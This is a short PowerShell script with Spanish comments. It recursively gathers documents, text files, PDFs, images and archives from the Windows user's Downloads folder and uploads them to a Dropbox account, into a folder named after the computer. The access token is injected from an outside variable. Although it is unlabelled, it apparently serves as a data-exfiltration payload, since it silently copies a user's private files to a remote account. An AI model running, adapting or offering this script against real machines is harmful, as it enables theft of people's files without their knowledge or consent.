# Token de acceso a Dropbox
$accessToken = $db

# Ruta de la carpeta de descargas del usuario
$localFolderPath = "$env:USERPROFILE\Downloads"

# Nombre del equipo
$computerName = "$env:COMPUTERNAME"

# URL de Dropbox para crear carpetas y subir archivos
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

# Encabezados para la solicitud HTTP
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/octet-stream"
}

# Obtener todos los archivos en la carpeta de descargas con las extensiones especificadas
$files = Get-ChildItem -Path $localFolderPath -Include "*.docx","*.txt","*.pdf","*.jpg","*.png","*.zip" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "/$computerName/$relativePath".Replace('\', '/')
    $dropboxArgs = @{
        "path" = $dropboxFilePath
        "mode" = "add"
        "autorename" = $true
        "mute" = $false
    } | ConvertTo-Json

    $headers["Dropbox-API-Arg"] = $dropboxArgs

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
        Write-Output "Uploaded: $($file.FullName) to $dropboxFilePath"
    }
    catch {
        Write-Output "Failed to upload: $($file.FullName)"
    }
}
